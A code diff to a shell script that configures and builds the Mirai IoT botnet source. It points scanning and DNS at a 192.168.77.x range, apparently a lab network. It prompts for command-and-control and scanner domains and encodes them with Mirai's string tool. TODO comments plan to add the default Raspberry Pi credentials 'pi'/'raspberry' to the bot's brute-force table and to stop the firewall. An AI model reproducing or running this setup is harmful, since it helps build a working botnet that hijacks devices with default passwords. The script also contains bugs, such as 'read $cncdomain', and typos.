@@ -78,10 +78,18 @@ sed -i -e 's/return INET_ADDR(o1,o2,o3,o4);/return INET_ADDR(192,168,77,o4);/g' 
 sed -i -e 's/addr.sin_addr.s_addr = INET_ADDR(8,8,8,8);/addr.sin_addr.s_addr = INET_ADDR(192,168,77,1);/g' ~/mirai/Mirai-Source-Code/mirai/bot/resolv.c
 
 echo -e "Please give the domain name of the CNC"
-read $domainname 
+read $cncdomain
+
+echo -e "Please give the domain name of the Scanner"
+read $scandomain
 
 ./build.sh debug telnet
-./debug/enc string $domainname
+./debug/enc string $cncdomain
+./debug/enc string $scandomain
+# TODO: also do the encryption for pi / raspberry
+# ./debug/enc string pi
+# ./debug/enc string raspberry
+
 # TODO: add this output to table.c file
 
 # TODO: if iptables in place do service iptables stop && /etc/ini.d/iptbales stop
